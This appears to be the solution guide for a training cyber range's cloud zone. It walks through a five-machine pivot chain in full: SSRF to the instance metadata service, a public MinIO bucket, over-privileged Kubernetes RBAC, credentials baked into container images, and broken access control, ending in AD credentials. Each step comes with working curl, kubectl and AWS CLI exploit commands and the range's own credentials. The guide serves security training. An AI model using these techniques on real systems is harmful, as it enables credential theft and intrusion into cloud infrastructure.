# RNG-CLD-01 — PUL Cloud Zone
## OPERATION GRIDFALL | Cloud Infrastructure Range

---

## Network & Addressing

| Machine | Hostname | IP | Service | Port |
|---|---|---|---|---|
| M1 | cld-webapp | 11.0.2.10 | PUL Cloud Developer Portal (SSRF) | 8080 |
| M1 | cld-webapp | 169.254.169.254 | Cloud Metadata Service (IMDS) | 80 |
| M2 | cld-storage | 11.0.2.20 | MinIO Object Storage (S3-compatible) | 9000/9001 |
| M3 | cld-k8s | 11.0.2.30 | K3s Kubernetes API Server | 6443 |
| M4 | cld-registry | 11.0.2.40 | OCI Container Registry | 5000 |
| M5 | cld-iam | 11.0.2.50 | PUL Cloud IAM Console | 8080 |

> **Note:** Set static IPs on each VM matching the above before running setup.sh.
> The kubeconfig seeded in M2 hard-codes M3's IP as `11.0.2.30`.

---

## Pivot Chain

```
[Dev Zone M5 — AWX Job Output]
  cloud_portal_url  : http://11.0.2.10:8080
  cloud_api_key     : pul-cloud-dev-aK8x2mP9!2024
          ↓
  M1 — SSRF → IMDS (169.254.169.254)
  T1552.005 — Cloud Instance Metadata API
          ↓
  AccessKeyId    : AKIAPUL2024CLDSVC01
  SecretAccessKey: pULcLd/S3cr3t2024/K3y!
          ↓
  M2 — MinIO public bucket enumeration
  T1530 — Data from Cloud Storage Object
          ↓
  K8s token: pul-cloud-ci-runner-token-2024gridfall
  (from k8s/cloud-ci-kubeconfig.yaml in pul-cloud-backups bucket)
          ↓
  M3 — Kubernetes RBAC over-privilege → read Secrets
  T1613 / T1552.007 — Container API
          ↓
  registry-admin : Reg!stry@CLD2024  @  11.0.2.40:5000
          ↓
  M4 — Container Registry → image config blob → ENV vars
  T1552.001 — Credentials in Container Image
          ↓
  CLOUD_IAM_USER : cloud-iam-svc
  CLOUD_IAM_PASS : IAm@CLD!2025
          ↓
  M5 — Broken Access Control on /api/v1/integrations/export
  T1078.004 / T1199 — Cloud Account / Trusted Relationship
          ↓
  svc_ldap : Ld@pB1nd#2025!  @  cyberange.local  →  33.55.55.137
          ↓
  RNG-AD-01 — LDAP Passback on SRV08-WEB (33.55.55.129/admin/)
```

---

## Machine Details

### M1 — SSRF → Cloud Metadata (IMDS)

**Vulnerability:** Server-Side Request Forgery via URL Health Checker tool.
The app fetches arbitrary URLs from the server — no blocklist. Attackers
point it at `169.254.169.254` (the link-local IMDS address) to steal the
EC2-style IAM role credentials, which happen to match MinIO credentials on M2.

**Learning Objective:** SSRF in cloud environments is critical — the IMDS
is accessible from any process on the instance. This mirrors the CapitalOne
2019 breach chain.

**Exploit:**
```bash
# Via web UI: Tools → URL Health Checker
# URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Then: http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role

# Or via API key (from Dev Zone M5 AWX output):
curl -s -H "X-Cloud-API-Key: pul-cloud-dev-aK8x2mP9!2024" \
  -X POST http://11.0.2.10:8080/tools/url-check \
  -d "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role"
```

---

### M2 — Misconfigured Cloud Object Storage

**Vulnerability:** `pul-cloud-backups` bucket is set to public read+list policy.
The bucket contains infrastructure artefacts including a Kubernetes kubeconfig
with a service account token — intended only for CI/CD automation.

**Learning Objective:** Public S3 buckets exposing sensitive files remain
one of the most common cloud misconfiguration findings in real-world assessments.

**Exploit:**
```bash
# Using stolen M1 credentials with AWS CLI
export AWS_ACCESS_KEY_ID=AKIAPUL2024CLDSVC01
export AWS_SECRET_ACCESS_KEY='pULcLd/S3cr3t2024/K3y!'
aws s3 ls s3://pul-cloud-backups/ --endpoint-url http://11.0.2.20:9000
aws s3 ls s3://pul-cloud-backups/k8s/ --endpoint-url http://11.0.2.20:9000
aws s3 cp s3://pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml . \
    --endpoint-url http://11.0.2.20:9000

# Or via curl (public — no auth needed):
curl "http://11.0.2.20:9000/pul-cloud-backups?list-type=2"
curl http://11.0.2.20:9000/pul-cloud-backups/k8s/cloud-ci-kubeconfig.yaml
```

---

### M3 — Kubernetes RBAC Over-Privilege

**Vulnerability:** The `cloud-ci-runner` service account has been granted
`get,list` on Secrets in the `pul-cloud` namespace — a common misconfiguration
in real Kubernetes deployments. CI/CD runners should only need ConfigMap and
Deployment read access, not Secrets.

**Learning Objective:** K8s RBAC is complex and secrets over-exposure is
pervasive. This teaches `kubectl` enumeration and the importance of
secrets-of-secrets separation (e.g., using External Secrets Operator).

**Exploit:**
```bash
export KUBECONFIG=./cloud-ci-kubeconfig.yaml

# Enumerate the cluster
kubectl get all -n pul-cloud
kubectl get secrets -n pul-cloud

# Read the pivot secret
kubectl get secret registry-creds -n pul-cloud -o jsonpath='{.data.password}' | base64 -d
kubectl get secret registry-creds -n pul-cloud -o json | python3 -c \
  "import sys,json,base64; d=json.load(sys.stdin)['data']; [print(k,'=',base64.b64decode(v).decode()) for k,v in d.items()]"

# Or raw API:
curl -sk -H "Authorization: Bearer pul-cloud-ci-runner-token-2024gridfall" \
  https://11.0.2.30:6443/api/v1/namespaces/pul-cloud/secrets/registry-creds \
  | python3 -m json.tool
```

---

### M4 — Hardcoded Credentials in Container Image

**Vulnerability:** The `pul-cloud/platform-svc` image was built with IAM
credentials embedded in the `ENV` instruction of the Dockerfile — a common
mistake when secrets are not managed via runtime injection (Vault agent sidecar,
Kubernetes Secrets env injection, etc.).

**Learning Objective:** Container image hygiene. `docker inspect` / registry
API reveal all ENV vars in build-time image config. Teaches Manifest v2,
config blob download, and why build-time secrets are never safe.

**Exploit:**
```bash
# Step 1: List repositories
curl -u "registry-admin:Reg!stry@CLD2024" http://11.0.2.40:5000/v2/_catalog

# Step 2: Get manifest — note config digest
curl -u "registry-admin:Reg!stry@CLD2024" \
  http://11.0.2.40:5000/v2/pul-cloud/platform-svc/manifests/latest \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" | python3 -m json.tool

# Step 3: Download config blob (contains ENV vars)
CONFIG_DIGEST=$(curl -su "registry-admin:Reg!stry@CLD2024" \
  http://11.0.2.40:5000/v2/pul-cloud/platform-svc/manifests/latest \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['config']['digest'])")

curl -u "registry-admin:Reg!stry@CLD2024" \
  http://11.0.2.40:5000/v2/pul-cloud/platform-svc/blobs/${CONFIG_DIGEST} \
  | python3 -c "import sys,json; [print(e) for e in json.load(sys.stdin)['config']['Env'] if 'IAM' in e]"

# Also: download layer tarball and extract config file
LAYER_DIGEST=$(curl -su "registry-admin:Reg!stry@CLD2024" \
  http://11.0.2.40:5000/v2/pul-cloud/platform-svc/manifests/latest \
  -H "Accept: application/vnd.docker.distribution.manifest.v2+json" \
  | python3 -c "import sys,json; print(json.load(sys.stdin)['layers'][0]['digest'])")

curl -u "registry-admin:Reg!stry@CLD2024" \
  http://11.0.2.40:5000/v2/pul-cloud/platform-svc/blobs/${LAYER_DIGEST} \
  | tar xzO opt/app/config/.env
```

---

### M5 — Broken Access Control → AD Pivot

**Vulnerability:** The `/api/v1/integrations/<id>/export` endpoint is
documented as requiring `federation_admin` role. The UI shows a padlock
for non-admin users. However, the server-side authorization check is missing
from the code. Any authenticated user can call the endpoint directly.

**Learning Objective:** Broken Object Level Authorization (BOLA/IDOR) is
OWASP API Security Top 10 #1. The UI restriction gives false confidence.
Server-side enforcement is mandatory.

**Exploit:**
```bash
# Login and capture session cookie
curl -s -c /tmp/iam-cookie.txt -X POST http://11.0.2.50:8080/login \
  -d "username=cloud-iam-svc&password=IAm%40CLD%212025" -L -o /dev/null

# Call the restricted endpoint directly (no role check server-side)
curl -s -b /tmp/iam-cookie.txt \
  http://11.0.2.50:8080/api/v1/integrations/int-ad-corp-001/export \
  | python3 -m json.tool

# Extract the LDAP bind password
curl -s -b /tmp/iam-cookie.txt \
  http://11.0.2.50:8080/api/v1/integrations/int-ad-corp-001/export \
  | python3 -c "import sys,json; d=json.load(sys.stdin)['data']['config']; print(d['bind_dn'],d['bind_password'])"
```

---

## Connection to RNG-AD-01

The M5 IAM export reveals:
- **Domain:** `cyberange.local`
- **DC IP:** `33.55.55.137` (DC03)
- **Account:** `svc_ldap`
- **Password:** `Ld@pB1nd#2025!`
- **Admin Panel Hint:** `http://33.55.55.129/admin/` (SRV08-WEB)

This is the starting credential for the AD range. The LDAP bind account
(`svc_ldap`) is used in the LDAP Passback attack against SRV08-WEB's
admin panel LDAP configuration page.

**Verification:**
```bash
nxc smb 33.55.55.137 -u svc_ldap -p 'Ld@pB1nd#2025!' -d cyberange.local
# Expected: [+] cyberange.local\svc_ldap:Ld@pB1nd#2025!
```

---

## Setup Order

Run on each VM in sequence:
```bash
sudo ./deps.sh     # requires internet — take snapshot after this
sudo ./setup.sh    # no internet needed — configures the challenge
```

Each setup.sh runs its own verification block and prints `[✓]`/`[✗]` for
every critical component. Fix any `[✗]` before running the range.

---

## MITRE ATT&CK Coverage

| Machine | Technique | ID |
|---|---|---|
| M1 | Server-Side Request Forgery | T1190 |
| M1 | Cloud Instance Metadata API | T1552.005 |
| M2 | Data from Cloud Storage Object | T1530 |
| M3 | Container and Resource Discovery | T1613 |
| M3 | Container API (K8s Secrets) | T1552.007 |
| M4 | Credentials in Container Image | T1552.001 |
| M5 | Valid Accounts: Cloud Accounts | T1078.004 |
| M5 | Trusted Relationship | T1199 |
